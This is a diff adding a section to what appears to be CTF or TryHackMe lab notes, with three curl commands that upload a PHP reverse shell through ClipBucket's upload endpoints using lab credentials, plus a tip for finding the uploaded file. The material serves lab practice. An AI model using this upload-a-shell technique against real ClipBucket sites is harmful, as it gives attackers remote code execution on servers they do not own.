@@ -231,7 +231,14 @@ ssh sys-internal@10.10.250.201 -i id_rsa -L 8111:localhost:8111
 whoami
 root
 ````
-
+### ClipBucket
+- File upload vulnerability with authentication 
+````
+curl --user developers:9972761drmfsls -F "file=@php_reverse_shell.php" -F "plupload=1" -F "name=php_reverse_shell.php" "http://broadcast.vulnnet.thm/actions/photo_uploader.php"
+curl --user developers:9972761drmfsls -F "file=@php_reverse_shell.php" -F "plupload=1" -F "name=php_reverse_shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
+curl --user developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
+````
+- Site will tell you the MD5 Hash name of the file and the directory it is located. Make sure to add the `.php` extension to the end. 
 
 
 
